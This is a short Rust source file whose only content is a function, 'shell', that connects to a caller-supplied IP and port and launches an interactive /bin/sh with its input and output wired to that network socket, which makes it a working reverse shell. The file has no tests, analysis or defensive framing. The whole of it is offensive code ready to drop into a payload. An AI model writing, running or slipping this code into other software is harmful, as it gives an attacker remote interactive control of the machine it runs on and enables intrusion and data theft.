use std::net::TcpStream;
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};

pub fn shell(ip: &str, port: u16) {
    let ip_port = format!("{ip}:{port}");

    // Make a TCP stream connection
    let stream = TcpStream::connect(ip_port).unwrap();

    // Use the stream as a file descriptor for sending stdin/stdout/stderr
    let fd = stream.as_raw_fd();

    // Open shell and set the file descriptor for stdin/stdout/stderr to the stream's file descriptor
    Command::new("/bin/sh")
        .arg("-i")
        .stdin(unsafe { Stdio::from_raw_fd(fd) })
        .stdout(unsafe { Stdio::from_raw_fd(fd) })
        .stderr(unsafe { Stdio::from_raw_fd(fd) })
        .spawn()
        .unwrap()
        .wait()
        .unwrap();
}
